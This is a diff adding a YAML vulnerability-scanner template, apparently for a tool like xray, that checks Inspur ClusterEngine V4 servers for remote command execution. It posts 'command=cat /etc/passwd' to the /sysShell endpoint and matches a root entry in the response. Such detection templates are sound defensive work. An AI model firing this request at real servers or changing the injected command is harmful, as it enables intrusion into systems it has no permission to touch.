@@ -1,0 +1,21 @@
+id:
+name: 硬件产品_浪潮服务器_clusterengine-rce
+transport: http
+tags:
+  - ClusterEngineV4
+rules:
+  req:
+    request:
+      cache: true
+      follow_redirects: true
+      method: POST
+      path: /sysShell
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: op=doPlease&node=cu01&command=cat /etc/passwd
+    expression: response.status==200 && 'root:.*:0:0'.bmatches(response.body)
+expression: req()
+detail:
+  vulnerability:
+    proof:
+      info: "存在 硬件产品_浪潮服务器_clusterengine-rce 漏洞"
